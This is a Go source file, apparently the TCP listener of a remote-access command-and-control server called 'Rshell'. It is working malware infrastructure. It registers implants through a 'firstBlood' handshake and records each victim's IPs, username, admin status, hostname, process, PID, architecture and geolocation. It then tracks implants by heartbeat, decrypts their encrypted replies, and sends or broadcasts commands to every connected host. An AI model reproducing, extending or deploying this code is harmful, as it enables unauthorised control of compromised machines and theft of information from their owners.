package tcp

import (
	"Rshell/pkg/connection"
	"Rshell/pkg/connection/base"
	"Rshell/pkg/database"
	"Rshell/pkg/encrypt"
	"Rshell/pkg/logger"
	"Rshell/pkg/qqwry"
	"Rshell/pkg/utils"
	"bufio"
	"encoding/base64"
	"encoding/binary"
	"fmt"
	"io"
	"net"
	"strconv"
	"sync"
	"time"
)

// TCPClient TCP客户端结构
type TCPClient struct {
	Conn          net.Conn
	UID           string
	WriteMu       sync.Mutex
	StopChan      chan struct{}
	LastHeartbeat time.Time
	TimeoutCount  int
	IsClosed      bool
	CloseOnce     sync.Once
	Reader        *bufio.Reader
}

// TCPServer TCP服务器结构
type TCPServer struct {
	Listener net.Listener
	StopChan chan struct{}
}

// TCPClientManager TCP客户端管理器
type TCPClientManager struct {
	Clients map[string]*TCPClient
	Mu      sync.RWMutex
}

var (
	globalTCPClientManager = &TCPClientManager{
		Clients: make(map[string]*TCPClient),
	}
)

// Add 添加客户端到管理器
func (cm *TCPClientManager) Add(uid string, client *TCPClient) {
	cm.Mu.Lock()
	defer cm.Mu.Unlock()
	cm.Clients[uid] = client
	logger.Info("TCP client added:", uid, "Total TCP clients:", len(cm.Clients))
}

// Remove 从管理器移除客户端
func (cm *TCPClientManager) Remove(uid string) {
	cm.Mu.Lock()
	defer cm.Mu.Unlock()
	if client, exists := cm.Clients[uid]; exists {
		if !client.IsClosed {
			client.Close()
		}
		delete(cm.Clients, uid)
		logger.Info("TCP client removed:", uid, "Total TCP clients:", len(cm.Clients))
	}
}

// Get 获取客户端
func (cm *TCPClientManager) Get(uid string) (*TCPClient, bool) {
	cm.Mu.RLock()
	defer cm.Mu.RUnlock()
	client, exists := cm.Clients[uid]
	return client, exists
}

// CloseAll 关闭所有客户端
func (cm *TCPClientManager) CloseAll() {
	cm.Mu.Lock()
	defer cm.Mu.Unlock()
	for uid, client := range cm.Clients {
		if !client.IsClosed {
			client.Close()
		}
		delete(cm.Clients, uid)
	}
	logger.Info("All TCP clients closed")
}

// Close 安全关闭TCP客户端
func (c *TCPClient) Close() {
	c.CloseOnce.Do(func() {
		c.IsClosed = true

		if c.StopChan != nil {
			close(c.StopChan)
		}
		if c.Conn != nil {
			c.Conn.Close()
		}
		if c.UID != "" {
			globalTCPClientManager.Remove(c.UID)
		}

		base.MarkOffline(c.UID)
	})
}

// Write 安全发送数据
func (c *TCPClient) Write(data []byte) error {
	c.WriteMu.Lock()
	defer c.WriteMu.Unlock()

	if c.IsClosed {
		return fmt.Errorf("connection closed")
	}

	c.Conn.SetWriteDeadline(time.Now().Add(10 * time.Second))
	_, err := c.Conn.Write(data)
	return err
}

// WriteWithLength 发送带长度的消息
func (c *TCPClient) WriteWithLength(data []byte) error {
	length := uint32(len(data))
	buf := make([]byte, 4+len(data))
	binary.BigEndian.PutUint32(buf[:4], length)
	copy(buf[4:], data)
	return c.Write(buf)
}

// startHeartbeatCheck 启动心跳检查
func (c *TCPClient) startHeartbeatCheck() {
	defer func() {
		if r := recover(); r != nil {
			logger.Error("TCP heartbeat checker panic recovered:", r)
		}
	}()

	ticker := time.NewTicker(10 * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-ticker.C:
			if c.IsClosed {
				return
			}
			if time.Since(c.LastHeartbeat) > 30*time.Second {
				c.TimeoutCount++
				logger.Warn("TCP heartbeat timeout for client:", c.UID, "Timeout count:", c.TimeoutCount)
				if c.TimeoutCount >= 3 {
					logger.Info("Max TCP heartbeat timeout reached, closing connection for client:", c.UID)
					c.Close()
					return
				}
			}
			if c.TimeoutCount > 0 {
				heartbeatMsg := make([]byte, 8)
				binary.BigEndian.PutUint32(heartbeatMsg[:4], 3)
				binary.BigEndian.PutUint32(heartbeatMsg[4:], 0)
				c.Write(heartbeatMsg)
			}
		case <-c.StopChan:
			return
		}
	}
}

// HandleTcpConnection 处理TCP连接
func HandleTcpConnection(conn net.Conn) {
	logger.Info("New TCP connection from:", conn.RemoteAddr())

	client := &TCPClient{
		Conn:          conn,
		StopChan:      make(chan struct{}),
		LastHeartbeat: time.Now(),
		IsClosed:      false,
		Reader:        bufio.NewReaderSize(conn, 1024*1024),
	}

	defer func() {
		if r := recover(); r != nil {
			logger.Error("TCP handler panic recovered:", r, "from:", conn.RemoteAddr())
		}
		client.Close()
		logger.Info("TCP handler finished for:", conn.RemoteAddr())
	}()

	conn.SetDeadline(time.Now().Add(30 * time.Second))

	for {
		if client.IsClosed {
			break
		}

		conn.SetReadDeadline(time.Now().Add(30 * time.Second))

		var length uint32
		err := binary.Read(client.Reader, binary.BigEndian, &length)
		if err != nil {
			if err == io.EOF {
				logger.Info("Client closed connection:", conn.RemoteAddr())
			} else if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
				logger.Info("TCP read timeout for:", conn.RemoteAddr())
			} else {
				logger.Error("Error reading message length:", err, "from:", conn.RemoteAddr())
			}
			break
		}

		if length == 0 {
			logger.Warn("Received zero-length message from:", conn.RemoteAddr())
			continue
		}

		if length < 4 {
			logger.Error("Message length too short:", length, "from:", conn.RemoteAddr())
			break
		}

		message := make([]byte, length)
		bytesRead, err := io.ReadFull(client.Reader, message)
		if err != nil {
			if err == io.EOF {
				logger.Info("Client closed connection while reading:", conn.RemoteAddr())
			} else if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
				logger.Info("TCP read content timeout for:", conn.RemoteAddr())
			} else {
				logger.Error("Error reading message content:", err, "from:", conn.RemoteAddr())
			}
			break
		}

		if uint32(bytesRead) != length {
			logger.Error("Message length mismatch, expected:", length, "actual:", bytesRead)
			break
		}

		msgType := binary.BigEndian.Uint32(message[:4])

		switch msgType {
		case 1: // firstBlood
			if len(message) < 5 {
				logger.Error("FirstBlood message too short from:", conn.RemoteAddr())
				break
			}

			msg := message[4:]
			if len(msg) == 0 {
				logger.Error("Empty FirstBlood payload from:", conn.RemoteAddr())
				break
			}

			tmpMetainfo, err := encrypt.DecodeBase64(msg)
			if err != nil {
				logger.Error("DecodeBase64 failed:", err, "from:", conn.RemoteAddr())
				break
			}

			metainfo, err := encrypt.DecryptNormal(tmpMetainfo)
			if err != nil {
				logger.Error("Decrypt failed:", err, "from:", conn.RemoteAddr())
				break
			}

			if len(metainfo) < 9 {
				logger.Error("Metainfo too short:", len(metainfo), "from:", conn.RemoteAddr())
				break
			}

			uid := encrypt.BytesToMD5(metainfo)
			client.UID = uid
			client.LastHeartbeat = time.Now()
			client.TimeoutCount = 0

			globalTCPClientManager.Add(uid, client)
			connection.GlobalManager.SetListenerType(uid, "tcp")

			go client.startHeartbeatCheck()

			var existingClient database.Clients
			exists, _ := database.Engine.Where("uid = ?", uid).Get(&existingClient)

			if !exists {
				publicKey := metainfo[:32]
				remaining := metainfo[32:]
				if len(remaining) < 9 {
					logger.Error("Metainfo insufficient for IP parsing:", conn.RemoteAddr())
					break
				}

				ipInt := binary.LittleEndian.Uint32(remaining[5:9])
				localIP := utils.Uint32ToIP(ipInt).String()

				var osInfo string
				if len(remaining) > 9 {
					osInfo = string(remaining[9:])
				}

				hostName, userName, processName := base.SafeSplitOSInfo(osInfo)

				remoteAddr := conn.RemoteAddr().String()
				externalIp, _, err := net.SplitHostPort(remoteAddr)
				if err != nil {
					externalIp = remoteAddr
				}
				if externalIp == "::1" {
					externalIp = "127.0.0.1"
				}

				processID := binary.BigEndian.Uint32(remaining[:4])
				flag := int(remaining[4])

				arch := "x86"
				if flag > 8 {
					userName += "*"
					flag = flag - 8
				}
				if flag > 4 {
					arch = "x64"
				}

				formattedTime := time.Now().Format("01-02 15:04")

				c := database.Clients{
					Uid:        uid,
					FirstStart: formattedTime,
					ExternalIP: externalIp,
					InternalIP: localIP,
					Username:   userName,
					Computer:   hostName,
					Process:    processName,
					Pid:        strconv.Itoa(int(processID)),
					Address:    getLocation(externalIp),
					Arch:       arch,
					Note:       "",
					Sleep:      "0",
					Online:     "1",
					Color:      "",
					PublicKey:  base64.StdEncoding.EncodeToString(publicKey[:]),
				}
				encrypt.PublicKeyMap[uid] = base64.StdEncoding.EncodeToString(publicKey[:])
				if _, err := database.Engine.Insert(&c); err != nil {
					logger.Error("Failed to insert client:", err)
				}
				database.Engine.Insert(&database.Shell{Uid: uid, ShellContent: ""})
				database.Engine.Insert(&database.Notes{Uid: uid, Note: ""})

				go notifyOnline(c)
				logger.Info("New TCP client registered:", uid, "IP:", externalIp)
			} else {
				base.ReconnectClient(uid)
			}

		case 2: // otherMsg
			if len(message) < 8 {
				logger.Error("OtherMsg message too short from:", conn.RemoteAddr())
				break
			}

			msg := message[4:]
			if len(msg) < 4 {
				logger.Error("OtherMsg too short")
				break
			}

			metaLen := binary.BigEndian.Uint32(msg[:4])
			if metaLen > uint32(len(msg)-4) || metaLen == 0 {
				logger.Error("Invalid meta length:", metaLen, "available:", len(msg)-4)
				break
			}

			metaMsg := msg[4 : 4+metaLen]
			realMsg := msg[4+metaLen:]

			if len(realMsg) == 0 {
				logger.Error("Empty real message")
				break
			}

			tmpMetainfo, err := encrypt.DecodeBase64(metaMsg)
			if err != nil {
				logger.Error("DecodeBase64 failed:", err)
				break
			}

			metainfo, err := encrypt.DecryptNormal(tmpMetainfo)
			if err != nil {
				logger.Error("Decrypt failed:", err)
				break
			}

			uid := encrypt.BytesToMD5(metainfo)

			if _, exists := globalTCPClientManager.Get(uid); !exists {
				logger.Warn("Received message from offline TCP client:", uid)
				break
			}

			dataBytes, err := encrypt.DecodeBase64(realMsg)
			if err != nil {
				logger.Error("DecodeBase64 failed:", err)
				break
			}

			dataBytes, err = encrypt.Decrypt(dataBytes, uid)
			if err != nil {
				logger.Error("First decrypt failed:", err)
				break
			}

			dataBytes, err = encrypt.Decrypt(dataBytes, uid)
			if err != nil {
				logger.Error("Second decrypt failed:", err)
				break
			}

			if len(dataBytes) < 4 {
				logger.Error("Decrypted data too short:", len(dataBytes))
				break
			}

			replyTypeBytes := dataBytes[:4]
			data := dataBytes[4:]
			replyType := binary.BigEndian.Uint32(replyTypeBytes)

			handler := base.ReplyHandler{UID: uid}
			handler.Handle(replyType, data)

		case 3: // heartBeat
			if len(message) < 5 {
				logger.Error("HeartBeat message too short from:", conn.RemoteAddr())
				break
			}

			msg := message[4:]
			if len(msg) == 0 {
				logger.Error("Empty HeartBeat payload from:", conn.RemoteAddr())
				break
			}

			tmpMetainfo, err := encrypt.DecodeBase64(msg)
			if err != nil {
				logger.Error("DecodeBase64 failed:", err)
				break
			}

			metainfo, err := encrypt.DecryptNormal(tmpMetainfo)
			if err != nil {
				logger.Error("Decrypt failed:", err)
				break
			}

			uid := encrypt.BytesToMD5(metainfo)

			if c, exists := globalTCPClientManager.Get(uid); exists && !c.IsClosed {
				c.LastHeartbeat = time.Now()
				c.TimeoutCount = 0
			}

		default:
			logger.Warn("Unknown TCP message type:", msgType, "from:", conn.RemoteAddr())
		}
	}
}

func getLocation(ip string) string {
	loc, _ := qqwry.GetLocationByIP(ip)
	return loc
}

func notifyOnline(c database.Clients) {
	// Stub: webhooks.NotifyOnline was in original; kept as direct call to avoid import cycle
	// In the original code this called webhooks.NotifyOnline(c)
}

// Cleanup 全局清理函数
func Cleanup() {
	logger.Info("Starting TCP cleanup...")
	globalTCPClientManager.CloseAll()
	logger.Info("TCP cleanup completed")
}

// GetClientStats 获取客户端统计信息
func GetClientStats() map[string]interface{} {
	globalTCPClientManager.Mu.RLock()
	defer globalTCPClientManager.Mu.RUnlock()

	stats := make(map[string]interface{})
	stats["total_tcp_clients"] = len(globalTCPClientManager.Clients)

	onlineCount := 0
	for _, client := range globalTCPClientManager.Clients {
		if !client.IsClosed {
			onlineCount++
		}
	}
	stats["online_tcp_clients"] = onlineCount

	return stats
}

// GetClient 获取指定TCP客户端
func GetClient(uid string) *TCPClient {
	if client, exists := globalTCPClientManager.Get(uid); exists && !client.IsClosed {
		return client
	}
	return nil
}

// SendToClient 向指定TCP客户端发送消息
func SendToClient(uid string, message []byte) error {
	client := GetClient(uid)
	if client == nil {
		return fmt.Errorf("TCP client not found or offline")
	}

	return client.Write(message)
}

// BroadcastToAll 广播消息给所有TCP客户端
func BroadcastToAll(message []byte) {
	globalTCPClientManager.Mu.RLock()
	defer globalTCPClientManager.Mu.RUnlock()

	for uid, client := range globalTCPClientManager.Clients {
		if !client.IsClosed {
			if err := client.WriteWithLength(message); err != nil {
				logger.Error("Failed to broadcast to TCP client:", uid, "Error:", err)
			}
		}
	}
}
